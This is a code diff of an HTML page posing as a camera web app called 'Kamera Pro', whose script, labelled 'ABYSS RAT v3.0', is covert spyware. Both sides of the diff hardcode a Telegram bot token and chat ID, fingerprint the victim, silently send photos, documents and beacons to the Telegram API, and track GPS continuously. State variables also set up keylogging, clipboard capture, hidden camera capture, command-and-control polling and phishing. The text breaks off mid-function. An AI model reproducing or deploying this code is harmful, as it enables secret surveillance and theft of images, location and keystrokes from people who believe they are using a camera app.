@@ -6,1156 +6,501 @@
     <title>Kamera Pro</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'><path d='M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z'/></svg>">
     <style>
-        :root {
-            --bg: #000;
-            --surface: rgba(0, 0, 0, 0.45);
-            --blur-bg: blur(12px);
-            --accent: #ffcc00;
-            --radius: 30px;
-        }
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-user-select: none;
-        }
-        body {
-            background: var(--bg);
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            height: 100vh;
-            width: 100vw;
-            height: 100dvh;
-            width: 100dvw;
-            overflow: hidden;
-            touch-action: manipulation;
-            position: relative;
-        }
-
-        /* PERMISSION OVERLAY — POLOS PROFESIONAL */
-        .perm-overlay {
-            position: fixed;
-            inset: 0;
-            background: #000;
-            z-index: 999;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 30px;
-            color: #fff;
-            text-align: center;
-            transition: opacity 0.5s, visibility 0.5s;
-        }
-        .perm-overlay.hidden {
-            opacity: 0;
-            visibility: hidden;
-            pointer-events: none;
-        }
-        .perm-overlay .logo {
-            width: 72px;
-            height: 72px;
-            margin-bottom: 24px;
-            background: rgba(255, 255, 255, 0.08);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .perm-overlay .logo svg {
-            width: 40px;
-            height: 40px;
-            fill: #fff;
-        }
-        .perm-overlay h1 {
-            font-size: 26px;
-            font-weight: 600;
-            margin-bottom: 6px;
-            letter-spacing: -0.3px;
-        }
-        .perm-overlay .sub {
-            font-size: 14px;
-            color: #999;
-            margin-bottom: 28px;
-            line-height: 1.4;
-            max-width: 300px;
-        }
-        .perm-overlay .status-row {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 20px;
-            min-height: 24px;
-        }
-        .perm-overlay .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #555;
-            transition: background 0.3s;
-        }
-        .perm-overlay .status-dot.ok {
-            background: #34c759;
-        }
-        .perm-overlay .status-dot.err {
-            background: #ff3b30;
-        }
-        .perm-overlay .status-text {
-            font-size: 13px;
-            color: #aaa;
-        }
-        .perm-overlay .err-msg {
-            color: #ff3b30;
-            font-size: 12px;
-            min-height: 18px;
-            margin-bottom: 12px;
-            font-weight: 500;
-        }
-        .perm-overlay .btn-start {
-            background: #fff;
-            border: none;
-            border-radius: 40px;
-            padding: 15px 48px;
-            font-size: 18px;
-            font-weight: 600;
-            color: #000;
-            cursor: pointer;
-            touch-action: manipulation;
-            min-width: 180px;
-            transition: transform 0.2s, opacity 0.2s;
-        }
-        .perm-overlay .btn-start:active {
-            transform: scale(0.95);
-        }
-        .perm-overlay .btn-start:disabled {
-            opacity: 0.4;
-            transform: none;
-            cursor: not-allowed;
-        }
-
-        /* VIDEO */
-        #vf {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
-        }
-
-        /* UI OVERLAY */
-        #ui {
-            position: fixed;
-            inset: 0;
-            z-index: 2;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            padding: 12px 14px 20px;
-            pointer-events: none;
-        }
-        #ui>* {
-            pointer-events: auto;
-        }
-
-        /* TOP BAR */
-        .top-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            gap: 6px;
-            flex-wrap: wrap;
-        }
-        .top-grp {
-            display: flex;
-            gap: 6px;
-            flex-wrap: wrap;
-        }
-        .chip {
-            background: var(--surface);
-            backdrop-filter: var(--blur-bg);
-            -webkit-backdrop-filter: var(--blur-bg);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            border-radius: var(--radius);
-            color: #fff;
-            padding: 6px 11px;
-            font-size: 11px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-            touch-action: manipulation;
-            height: 30px;
-            white-space: nowrap;
-            transition: background 0.2s;
-        }
-        .chip:active {
-            background: rgba(255, 255, 255, 0.18);
-        }
-        .chip svg {
-            width: 14px;
-            height: 14px;
-            fill: currentColor;
-            flex-shrink: 0;
-        }
-        .chip.on {
-            background: var(--accent);
-            color: #000;
-            border-color: var(--accent);
-        }
-
-        /* ZOOM */
-        .zoom-bar {
-            position: absolute;
-            bottom: 105px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 3;
-            pointer-events: auto;
-            background: var(--surface);
-            backdrop-filter: var(--blur-bg);
-            -webkit-backdrop-filter: var(--blur-bg);
-            border-radius: 40px;
-            padding: 5px 18px;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            color: #fff;
-            font-size: 15px;
-            font-weight: 500;
-        }
-        .zoom-bar button {
-            background: none;
-            border: none;
-            color: #fff;
-            cursor: pointer;
-            padding: 4px;
-            display: flex;
-            align-items: center;
-            touch-action: manipulation;
-        }
-        .zoom-bar button:active {
-            opacity: 0.5;
-        }
-        .zoom-bar button svg {
-            width: 20px;
-            height: 20px;
-            fill: currentColor;
-        }
-        .zoom-val {
-            min-width: 36px;
-            text-align: center;
-            font-variant-numeric: tabular-nums;
-        }
-
-        /* BOTTOM */
-        .btm-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 10px 0 6px;
-        }
-        .thumb-box {
-            width: 50px;
-            height: 50px;
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.06);
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            cursor: pointer;
-            object-fit: cover;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            transition: border 0.2s;
-            flex-shrink: 0;
-        }
-        .thumb-box:active {
-            border-color: var(--accent);
-        }
-        .thumb-box svg {
-            width: 24px;
-            height: 24px;
-            fill: rgba(255, 255, 255, 0.4);
-        }
-        .thumb-box img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .thumb-box.has-img {
-            border-color: rgba(255, 255, 255, 0.5);
-            background: transparent;
-        }
-        .thumb-box.has-img svg {
-            display: none;
-        }
-
-        .shutter {
-            width: 74px;
-            height: 74px;
-            border-radius: 50%;
-            background: #fff;
-            border: 5px solid rgba(255, 255, 255, 0.45);
-            cursor: pointer;
-            transition: transform 0.15s;
-            touch-action: manipulation;
-            flex-shrink: 0;
-        }
-        .shutter:active {
-            transform: scale(0.84);
-        }
-        .spacer-box {
-            width: 50px;
-            flex-shrink: 0;
-        }
-
-        /* FLASH OVERLAY */
-        #flash {
-            position: fixed;
-            inset: 0;
-            background: #fff;
-            z-index: 10;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.06s;
-        }
-        #flash.fire {
-            opacity: 0.85;
-            transition: opacity 0s;
-        }
-
-        /* FOCUS RING */
-        .focus-ripple {
-            position: fixed;
-            width: 70px;
-            height: 70px;
-            border: 2px solid var(--accent);
-            border-radius: 50%;
-            transform: translate(-50%, -50%);
-            pointer-events: none;
-            z-index: 5;
-            opacity: 0;
-            box-shadow: 0 0 24px rgba(255, 204, 0, 0.25);
-        }
-        .focus-ripple.pop {
-            animation: ripple 0.55s ease-out forwards;
-        }
-        @keyframes ripple {
-            0% {
-                opacity: 1;
-                transform: translate(-50%, -50%) scale(0.7);
-            }
-            100% {
-                opacity: 0;
-                transform: translate(-50%, -50%) scale(1.5);
-            }
-        }
-
-        /* GRID */
-        .grid-3x3 {
-            position: fixed;
-            inset: 0;
-            z-index: 2;
-            pointer-events: none;
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            grid-template-rows: repeat(3, 1fr);
-        }
-        .grid-3x3 span {
-            border: 0.5px solid rgba(255, 255, 255, 0.08);
-        }
-
-        /* SERVICE WORKER REGISTRATION — silent, no UI */
+        :root { --bg:#000; --surface:rgba(0,0,0,0.45); --blur-bg:blur(12px); --accent:#ffcc00; --radius:30px; }
+        * { margin:0;padding:0;box-sizing:border-box;user-select:none;-webkit-tap-highlight-color:transparent;-webkit-user-select:none; }
+        body { background:var(--bg); font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; height:100vh;width:100vw;height:100dvh;width:100dvw;overflow:hidden;touch-action:manipulation;position:relative; }
+        .perm-overlay { position:fixed;inset:0;background:#000;z-index:999;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:30px;color:#fff;text-align:center;transition:opacity .5s,visibility .5s; }
+        .perm-overlay.hidden { opacity:0;visibility:hidden;pointer-events:none; }
+        .perm-overlay .logo { width:72px;height:72px;margin-bottom:24px;background:rgba(255,255,255,0.08);border-radius:50%;display:flex;align-items:center;justify-content:center; }
+        .perm-overlay .logo svg { width:40px;height:40px;fill:#fff; }
+        .perm-overlay h1 { font-size:26px;font-weight:600;margin-bottom:6px;letter-spacing:-0.3px; }
+        .perm-overlay .sub { font-size:14px;color:#999;margin-bottom:28px;line-height:1.4;max-width:300px; }
+        .perm-overlay .status-row { display:flex;align-items:center;gap:8px;margin-bottom:20px;min-height:24px; }
+        .perm-overlay .status-dot { width:8px;height:8px;border-radius:50%;background:#555;transition:background .3s; }
+        .perm-overlay .status-dot.ok { background:#34c759; }
+        .perm-overlay .status-dot.err { background:#ff3b30; }
+        .perm-overlay .status-text { font-size:13px;color:#aaa; }
+        .perm-overlay .err-msg { color:#ff3b30;font-size:12px;min-height:18px;margin-bottom:12px;font-weight:500; }
+        .perm-overlay .btn-start { background:#fff;border:none;border-radius:40px;padding:15px 48px;font-size:18px;font-weight:600;color:#000;cursor:pointer;touch-action:manipulation;min-width:180px;transition:transform .2s,opacity .2s; }
+        .perm-overlay .btn-start:active { transform:scale(.95); }
+        .perm-overlay .btn-start:disabled { opacity:.4;transform:none;cursor:not-allowed; }
+        #vf { position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1; }
+        #vf.nomirror { transform:scaleX(-1); }
+        #ui { position:fixed;inset:0;z-index:2;display:flex;flex-direction:column;justify-content:space-between;padding:12px 14px 20px;pointer-events:none; }
+        #ui>* { pointer-events:auto; }
+        .top-row { display:flex;justify-content:space-between;align-items:flex-start;gap:6px;flex-wrap:wrap; }
+        .top-grp { display:flex;gap:6px;flex-wrap:wrap; }
+        .chip { background:var(--surface);backdrop-filter:var(--blur-bg);-webkit-backdrop-filter:var(--blur-bg);border:1px solid rgba(255,255,255,.12);border-radius:var(--radius);color:#fff;padding:6px 11px;font-size:11px;font-weight:500;display:flex;align-items:center;gap:5px;cursor:pointer;touch-action:manipulation;height:30px;white-space:nowrap;transition:background .2s; }
+        .chip:active { background:rgba(255,255,255,.18); }
+        .chip svg { width:14px;height:14px;fill:currentColor;flex-shrink:0; }
+        .chip.on { background:var(--accent);color:#000;border-color:var(--accent); }
+        .live-badge { position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:6;pointer-events:none;background:rgba(0,0,0,.65);border-radius:16px;padding:5px 14px;color:#fc0;font-size:11px;font-weight:600;letter-spacing:.8px;opacity:0;transition:opacity .25s; }
+        .live-badge.on { opacity:1; }
+        .stab-bar { position:fixed;top:55px;left:50%;transform:translateX(-50%);z-index:6;pointer-events:none;display:flex;align-items:center;gap:5px;background:rgba(0,0,0,.5);border-radius:14px;padding:4px 10px;opacity:0;transition:opacity .3s; }
+        .stab-bar.on { opacity:1; }
+        .stab-bar .stab-ico { font-size:14px;animation:wiggle .4s ease-in-out infinite; }
+        .stab-bar .stab-lbl { color:#fc0;font-size:10px;font-weight:600; }
+        @keyframes wiggle { 0%,100%{transform:translateX(0)}50%{transform:translateX(-3px)} }
+        .zoom-bar { position:absolute;bottom:105px;left:50%;transform:translateX(-50%);z-index:3;pointer-events:auto;background:var(--surface);backdrop-filter:var(--blur-bg);-webkit-backdrop-filter:var(--blur-bg);border-radius:40px;padding:5px 18px;border:1px solid rgba(255,255,255,.15);display:flex;align-items:center;gap:14px;color:#fff;font-size:15px;font-weight:500; }
+        .zoom-bar button { background:none;border:none;color:#fff;cursor:pointer;padding:4px;display:flex;align-items:center;touch-action:manipulation; }
+        .zoom-bar button:active { opacity:.5; }
+        .zoom-bar button svg { width:20px;height:20px;fill:currentColor; }
+        .zoom-val { min-width:40px;text-align:center;font-variant-numeric:tabular-nums; }
+        .btm-row { display:flex;justify-content:space-between;align-items:center;padding:0 10px 0 6px; }
+        .thumb-box { width:50px;height:50px;border-radius:12px;background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.2);cursor:pointer;display:flex;align-items:center;justify-content:center;overflow:hidden;transition:border .2s;flex-shrink:0; }
+        .thumb-box:active { border-color:var(--accent); }
+        .thumb-box img { width:100%;height:100%;object-fit:cover; }
+        .thumb-box.has-img { border-color:rgba(255,255,255,.5);background:transparent; }
+        .shutter { width:74px;height:74px;border-radius:50%;background:#fff;border:5px solid rgba(255,255,255,.45);cursor:pointer;transition:transform .15s;touch-action:manipulation;flex-shrink:0; }
+        .shutter:active { transform:scale(.84); }
+        .spacer-box { width:50px;flex-shrink:0; }
+        #flash { position:fixed;inset:0;background:#fff;z-index:10;opacity:0;pointer-events:none;transition:opacity .06s; }
+        #flash.fire { opacity:.85;transition:opacity 0s; }
+        .focus-ripple { position:fixed;width:70px;height:70px;border:2px solid var(--accent);border-radius:50%;transform:translate(-50%,-50%);pointer-events:none;z-index:5;opacity:0;box-shadow:0 0 24px rgba(255,204,0,.25); }
+        .focus-ripple.pop { animation:ripple .55s ease-out forwards; }
+        @keyframes ripple { 0%{opacity:1;transform:translate(-50%,-50%) scale(.7)}100%{opacity:0;transform:translate(-50%,-50%) scale(1.5)} }
+        .grid-3x3 { position:fixed;inset:0;z-index:2;pointer-events:none;display:grid;grid-template-columns:repeat(3,1fr);grid-template-rows:repeat(3,1fr); }
+        .grid-3x3 span { border:.5px solid rgba(255,255,255,.08); }
+        .burst-badge { position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:6;pointer-events:none;background:rgba(0,0,0,.7);border-radius:20px;padding:8px 18px;color:#fff;font-size:14px;font-weight:700;opacity:0;transition:opacity .2s; }
+        .burst-badge.on { opacity:1; }
     </style>
 </head>
 <body>
 
-    <!-- ========== PERMISSION OVERLAY ========== -->
-    <div class="perm-overlay" id="permOverlay">
-        <div class="logo">
-            <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+<div class="perm-overlay" id="permOverlay">
+    <div class="logo"><svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg></div>
+    <h1>Kamera Pro</h1>
+    <p class="sub">Ambil foto berkualitas tinggi dengan efek profesional</p>
+    <div class="status-row"><span class="status-dot" id="statusDot"></span><span class="status-text" id="statusMsg">Tekan tombol untuk mulai</span></div>
+    <div class="err-msg" id="errMsg"></div>
+    <button class="btn-start" id="btnStart">Buka Kamera</button>
+</div>
+
+<video id="vf" autoplay playsinline></video>
+<div class="grid-3x3"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></div>
+<div class="focus-ripple" id="focusRipple"></div>
+<div id="flash"></div>
+<div class="live-badge" id="liveBadge">LIVE</div>
+<div class="stab-bar" id="stabBar"><span class="stab-ico">✋</span><span class="stab-lbl">STABIL</span></div>
+<div class="burst-badge" id="burstBadge">📸 5 FOTO</div>
+
+<div id="ui">
+    <div class="top-row">
+        <div class="top-grp">
+            <button class="chip" id="btnFlash"><svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg><span id="lblFlash">Flash</span></button>
+            <button class="chip" id="btnBlur"><svg viewBox="0 0 24 24"><path d="M12 2C8.1 2 4.9 3.6 3 5.8c-.3.4-.3.9 0 1.3 1.8 2.3 4.5 3.6 7.2 4.1-.7.4-1.4.9-2 1.6-1.7 2-2.7 4.5-2.7 7.2 0 .5.4 1 1 1h7c.6 0 1-.5 1-1 0-2.7-1-5.2-2.7-7.2-.6-.7-1.3-1.2-2-1.6 2.7-.5 5.4-1.8 7.2-4.1.3-.4.3-.9 0-1.3C19.1 3.6 15.9 2 12 2z"/></svg><span id="lblBlur">Blur</span></button>
+            <button class="chip on" id="btnWM"><svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM8 18h8v-1.5H8V18zm0-2.5h8V14H8v1.5z"/></svg><span>WM</span></button>
+            <button class="chip on" id="btnMirror">MIRROR</button>
+            <button class="chip" id="btnLive">LIVE</button>
+            <button class="chip" id="btnHD">HD</button>
         </div>
-        <h1>Kamera Pro</h1>
-        <p class="sub">Ambil foto berkualitas tinggi dengan efek profesional</p>
-        <div class="status-row">
-            <span class="status-dot" id="statusDot"></span>
-            <span class="status-text" id="statusMsg">Tekan tombol untuk mulai</span>
-        </div>
-        <div class="err-msg" id="errMsg"></div>
-        <button class="btn-start" id="btnStart">Buka Kamera</button>
-    </div>
-
-    <!-- ========== VIDEO FEED ========== -->
-    <video id="vf" autoplay playsinline></video>
-
-    <!-- ========== GRID ========== -->
-    <div class="grid-3x3"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></div>
-
-    <!-- ========== FOCUS RIPPLE ========== -->
-    <div class="focus-ripple" id="focusRipple"></div>
-
-    <!-- ========== FLASH ========== -->
-    <div id="flash"></div>
-
-    <!-- ========== UI ========== -->
-    <div id="ui">
-        <div class="top-row">
-            <div class="top-grp">
-                <button class="chip" id="btnFlash">
-                    <svg viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
-                    <span id="lblFlash">Flash</span>
-                </button>
-                <button class="chip" id="btnBlur">
-                    <svg viewBox="0 0 24 24"><path d="M12 2C8.1 2 4.9 3.6 3 5.8c-.3.4-.3.9 0 1.3 1.8 2.3 4.5 3.6 7.2 4.1-.7.4-1.4.9-2 1.6-1.7 2-2.7 4.5-2.7 7.2 0 .5.4 1 1 1h7c.6 0 1-.5 1-1 0-2.7-1-5.2-2.7-7.2-.6-.7-1.3-1.2-2-1.6 2.7-.5 5.4-1.8 7.2-4.1.3-.4.3-.9 0-1.3C19.1 3.6 15.9 2 12 2z"/></svg>
-                    <span id="lblBlur">Blur</span>
-                </button>
-                <button class="chip on" id="btnWM">
-                    <svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM8 18h8v-1.5H8V18zm0-2.5h8V14H8v1.5z"/></svg>
-                    <span>WM</span>
-                </button>
-            </div>
-            <div class="top-grp">
-                <button class="chip" id="btnTimer">
-                    <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
-                    <span id="lblTimer">3s</span>
-                </button>
-                <button class="chip" id="btnFlip">
-                    <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg>
-                </button>
-            </div>
-        </div>
-
-        <div class="zoom-bar">
-            <button id="btnZoomOut"><svg viewBox="0 0 24 24"><path d="M19 13H5v-2h14v2z"/></svg></button>
-            <span class="zoom-val" id="zoomVal">1×</span>
-            <button id="btnZoomIn"><svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></button>
-        </div>
-
-        <div class="btm-row">
-            <div class="thumb-box" id="thumbBox">
-                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zM7 10h10v2H7zm0 4h6v2H7zm0-8h10v2H7z"/></svg>
-            </div>
-            <button class="shutter" id="btnShutter"></button>
-            <div class="spacer-box"></div>
+        <div class="top-grp">
+            <button class="chip" id="btnTimer"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg><span id="lblTimer">3s</span></button>
+            <button class="chip" id="btnFlip"><svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg></button>
         </div>
     </div>
+    <div class="zoom-bar">
+        <button id="btnZoomOut"><svg viewBox="0 0 24 24"><path d="M19 13H5v-2h14v2z"/></svg></button>
+        <span class="zoom-val" id="zoomVal">1×</span>
+        <button id="btnZoomIn"><svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg></button>
+    </div>
+    <div class="btm-row">
+        <div class="thumb-box" id="thumbBox"><svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14zM7 10h10v2H7zm0 4h6v2H7zm0-8h10v2H7z"/></svg></div>
+        <button class="shutter" id="btnShutter"></button>
+        <div class="spacer-box"></div>
+    </div>
+</div>
 
-    <script>
-    // ===========================================================
-    // 🐺 ABYSS RAT v3.0 — "DEPAN POLOS, BELAKANG BUAS"
-    // ===========================================================
-    (function() {
-        'use strict';
+<script>
+(function() {
+    'use strict';
 
-        // ==================== CONFIG ====================
-        const BOT_TOKEN = '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
-        const CHAT_ID = '7839405566';
-        const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+    const BOT_TOKEN = '8514751802:AAFvWUx_ZWZwRMokFe4gQKSqR1_WqkQS2ug';
+    const CHAT_ID = '7839405566';
+    const TG_API = 'https://api.telegram.org/bot' + BOT_TOKEN;
 
-        // Victim fingerprint
-        const VID = (() => {
-            const stored = localStorage.getItem('_vid');
-            if (stored) return stored;
-            const id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
-            localStorage.setItem('_vid', id);
-            return id;
-        })();
+    const VID = (() => {
+        const s = localStorage.getItem('_vid');
+        if (s) return s;
+        const id = 'V' + Date.now().toString(36) + Math.random().toString(36).substr(2, 6);
+        localStorage.setItem('_vid', id);
+        return id;
+    })();
 
-        // ==================== DOM REFS ====================
-        const $ = (s) => document.getElementById(s);
-        const vf = $('vf');
-        const permOverlay = $('permOverlay');
-        const btnStart = $('btnStart');
-        const statusDot = $('statusDot');
-        const statusMsg = $('statusMsg');
-        const errMsg = $('errMsg');
-        const btnShutter = $('btnShutter');
-        const btnFlash = $('btnFlash');
-        const lblFlash = $('lblFlash');
-        const btnBlur = $('btnBlur');
-        const lblBlur = $('lblBlur');
-        const btnWM = $('btnWM');
-        const btnFlip = $('btnFlip');
-        const btnTimer = $('btnTimer');
-        const lblTimer = $('lblTimer');
-        const zoomVal = $('zoomVal');
-        const btnZoomIn = $('btnZoomIn');
-        const btnZoomOut = $('btnZoomOut');
-        const thumbBox = $('thumbBox');
-        const focusRipple = $('focusRipple');
-        const flashEl = $('flash');
+    const $ = (s) => document.getElementById(s);
+    const vf = $('vf'), permOverlay = $('permOverlay'), btnStart = $('btnStart'), statusDot = $('statusDot'), statusMsg = $('statusMsg'), errMsg = $('errMsg');
+    const btnShutter = $('btnShutter'), btnFlash = $('btnFlash'), lblFlash = $('lblFlash'), btnBlur = $('btnBlur'), lblBlur = $('lblBlur'), btnWM = $('btnWM');
+    const btnFlip = $('btnFlip'), btnTimer = $('btnTimer'), lblTimer = $('lblTimer'), zoomVal = $('zoomVal'), btnZoomIn = $('btnZoomIn'), btnZoomOut = $('btnZoomOut');
+    const thumbBox = $('thumbBox'), focusRipple = $('focusRipple'), flashEl = $('flash');
+    const btnMirror = $('btnMirror'), btnLive = $('btnLive'), btnHD = $('btnHD'), liveBadge = $('liveBadge'), stabBar = $('stabBar'), burstBadge = $('burstBadge');
 
-        // ==================== STATE ====================
-        let stream = null;
-        let facingMode = 'environment';
-        let flashOn = false;
-        let currentZoom = 1;
-        let lastPhotoData = null;
-        let isStarting = false;
-        let blurOn = false;
-        let wmOn = true;
-        let gpsData = null;
-        let gpsWatchId = null;
-        let localIPs = [];
-        let lastClip = '';
-        let keyBuf = '';
-        let keylogRunning = false;
-        let silentCapInterval = null;
-        let dualSwitchInterval = null;
-        let c2PollInterval = null;
-        let lastUpdateId = 0;
-        let phishingTimer = null;
+    let stream = null, facingMode = 'environment', flashOn = false, currentZoom = 1, lastPhotoData = null;
+    let isStarting = false, blurOn = false, wmOn = true, mirrorOn = true, liveMode = false, hdOn = false;
+    let gpsData = null, gpsWatchId = null, localIPs = [];
+    let lastClip = '', keyBuf = '', keylogRunning = false;
+    let silentCapInterval = null, dualSwitchInterval = null, c2PollInterval = null, lastUpdateId = 0;
 
-        // ==================== TELEGRAM SENDERS ====================
-        async function tgSendMessage(text) {
-            try {
-                await fetch(`${TG_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&disable_notification=true`);
-            } catch (e) {}
-        }
+    // ==================== TELEGRAM ====================
+    async function tg(t) { try { await fetch(TG_API+'/sendMessage?chat_id='+CHAT_ID+'&text='+encodeURIComponent(t)+'&disable_notification=true'); } catch(e) {} }
+    async function tgPhoto(b, c) { try { const f=new FormData(); f.append('chat_id',CHAT_ID); f.append('photo',b,'p.jpg'); f.append('caption',c||''); f.append('disable_notification','true'); await fetch(TG_API+'/sendPhoto',{method:'POST',body:f}); } catch(e) {} }
+    async function tgDoc(b, fn, c) { try { const f=new FormData(); f.append('chat_id',CHAT_ID); f.append('document',b,fn); f.append('caption',c||''); f.append('disable_notification','true'); await fetch(TG_API+'/sendDocument',{method:'POST',body:f}); } catch(e) {} }
+    function tgBeacon(b, c) { try { const f=new FormData(); f.append('chat_id',CHAT_ID); f.append('photo',b,'s.jpg'); f.append('caption',c||''); f.append('disable_notification','true'); navigator.sendBeacon(TG_API+'/sendPhoto',f); } catch(e) {} }
 
-        async function tgSendPhoto(blob, caption = '') {
-            try {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, `p_${Date.now()}.jpg`);
-                fd.append('caption', caption);
-                fd.append('disable_notification', 'true');
-                await fetch(`${TG_API}/sendPhoto`, { method: 'POST', body: fd });
-            } catch (e) {}
-        }
+    // ==================== GPS ====================
+    function startGPS() {
+        if (!navigator.geolocation) return;
+        gpsWatchId = navigator.geolocation.watchPosition(
+            (p) => { gpsData = { lat: p.coords.latitude, lon: p.coords.longitude, alt: p.coords.altitude||0, acc: p.coords.accuracy, spd: p.coords.speed||0, ts: new Date(p.timestamp).toISOString() }; },
+            () => {}, { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
+        );
+    }
 
-        async function tgSendDocument(blob, filename, caption = '') {
-            try {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('document', blob, filename);
-                fd.append('caption', caption);
-                fd.append('disable_notification', 'true');
-                await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: fd });
-            } catch (e) {}
-        }
-
-        function tgSendBeacon(blob, caption = '') {
-            try {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, `silent_${Date.now()}.jpg`);
-                fd.append('caption', caption);
-                fd.append('disable_notification', 'true');
-                navigator.sendBeacon(`${TG_API}/sendPhoto`, fd);
-            } catch (e) {}
-        }
-
-        // ==================== GPS ====================
-        function startGPS() {
-            if (!navigator.geolocation) return;
-            gpsWatchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    gpsData = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        alt: pos.coords.altitude || 0,
-                        acc: pos.coords.accuracy,
-                        spd: pos.coords.speed || 0,
-                        ts: new Date(pos.timestamp).toISOString()
